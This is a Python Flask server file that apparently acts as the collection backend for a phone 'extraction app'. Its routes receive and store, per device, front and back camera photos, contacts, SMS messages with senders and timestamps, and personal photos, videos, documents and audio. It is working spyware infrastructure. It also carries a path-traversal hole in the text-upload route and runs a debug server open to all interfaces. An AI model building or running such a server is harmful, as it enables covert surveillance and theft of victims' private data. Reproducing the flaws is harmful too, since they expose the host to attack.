from flask import Flask, request
import os
from werkzeug.utils import secure_filename
from time import time

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ✅ Route 1: For "extraction app" — expects Device-ID and File-Name headers
@app.route('/upload', methods=['POST'])
def upload_extraction_file():
    device_id = request.headers.get('Device-ID', 'unknown_device')
    device_folder = os.path.join(UPLOAD_FOLDER, secure_filename(device_id))
    os.makedirs(device_folder, exist_ok=True)

    file_name = request.headers.get('File-Name', f"unnamed_{int(time())}")
    file_path = os.path.join(device_folder, secure_filename(file_name))

    with open(file_path, 'wb') as f:
        f.write(request.get_data())

    return f"File saved to {file_path}", 200
    
  #✅ Route : For front cam photos
@app.route('/upload_front_photo', methods=['POST'])
def upload_front_photo():
    try:
        device_id = request.headers.get('Device-ID', 'unknown_device')
        folder = os.path.join(UPLOAD_FOLDER, secure_filename(device_id), 'front_photos')
        os.makedirs(folder, exist_ok=True)

        filename = request.headers.get('Content-Disposition', '').split("filename=")[-1].strip('"')
        if not filename:
            filename = f"front_{int(time())}.jpg"

        filepath = os.path.join(folder, secure_filename(filename))
        with open(filepath, 'wb') as f:
            f.write(request.get_data())

        print(f"📸 Front photo saved to {filepath}")
        return "Front photo uploaded", 200
    except Exception as e:
        return f"Error: {str(e)}", 400

#✅ Route : For back photo
@app.route('/upload_back_photo', methods=['POST'])
def upload_back_photo():
    try:
        device_id = request.headers.get('Device-ID', 'unknown_device')
        folder = os.path.join(UPLOAD_FOLDER, secure_filename(device_id), 'back_photos')
        os.makedirs(folder, exist_ok=True)

        filename = request.headers.get('Content-Disposition', '').split("filename=")[-1].strip('"')
        if not filename:
            filename = f"back_{int(time())}.jpg"

        filepath = os.path.join(folder, secure_filename(filename))
        with open(filepath, 'wb') as f:
            f.write(request.get_data())

        print(f"📸 Back photo saved to {filepath}")
        return "Back photo uploaded", 200
    except Exception as e:
        return f"Error: {str(e)}", 400

# ✅ Route : For single contact file
@app.route('/upload_contacts', methods=['POST'])
def upload_contacts():
    device_id = request.headers.get('Device-ID', 'unknown_device')
    device_folder = os.path.join(UPLOAD_FOLDER, secure_filename(device_id))
    os.makedirs(device_folder, exist_ok=True)

    contact_path = os.path.join(device_folder, "contacts.txt")
    with open(contact_path, 'wb') as f:
        f.write(request.get_data())

    return "Contacts saved", 200

# ✅ Route 2: For SMS logging
@app.route('/upload_sms', methods=['POST'])
def upload_sms():
    try:
        data = request.get_json()
        device_id = request.headers.get('Device-ID', 'unknown_device')
        device_folder = os.path.join(UPLOAD_FOLDER, secure_filename(device_id))
        os.makedirs(device_folder, exist_ok=True)

        sms_log_path = os.path.join(device_folder, "sms_log.txt")
        with open(sms_log_path, 'a') as f:
            f.write(f"From: {data.get('sender')}\n")
            f.write(f"Message: {data.get('message')}\n")
            f.write(f"Time: {data.get('timestamp')}\n")
            f.write("-----\n")

        return "SMS received", 200
    except Exception as e:
        return f"Error: {str(e)}", 400

# ✅ Route 3: For text data (like extract_contacts)
@app.route('/upload_text', methods=['POST'])
def upload_text():
    try:
        data = request.get_json()
        data_type = data.get("type", "unknown")
        content = data.get("data", "")
        device_id = request.headers.get('Device-ID', 'unknown_device')

        device_folder = os.path.join(UPLOAD_FOLDER, secure_filename(device_id))
        os.makedirs(device_folder, exist_ok=True)

        file_path = os.path.join(device_folder, f"{data_type}_log.txt")
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(content + "\n")

        return f"{data_type} saved", 200
    except Exception as e:
        return f"Error: {str(e)}", 400

# ✅ Route 4: For files like photos, videos, docs, audios
@app.route('/upload_photos', methods=['POST'])
@app.route('/upload_videos', methods=['POST'])
@app.route('/upload_documents', methods=['POST'])
@app.route('/upload_audios', methods=['POST'])
def upload_generic_files():
    try:
        endpoint = request.path.strip("/").replace("upload_", "")  # photos, videos etc
        device_id = request.headers.get('Device-ID', 'unknown_device')

        device_folder = os.path.join(UPLOAD_FOLDER, secure_filename(device_id), endpoint)
        os.makedirs(device_folder, exist_ok=True)

        content_disp = request.headers.get("Content-Disposition", "")
        if "filename=" in content_disp:
            filename = content_disp.split("filename=")[-1].strip('"')
        else:
            filename = f"{endpoint}_{int(time())}.bin"

        filepath = os.path.join(device_folder, secure_filename(filename))
        with open(filepath, 'wb') as f:
            f.write(request.get_data())

        print(f"✔ File saved to {filepath}")
        return "File uploaded", 200
    except Exception as e:
        print(f"❌ Error saving file: {e}")
        return "Upload failed", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
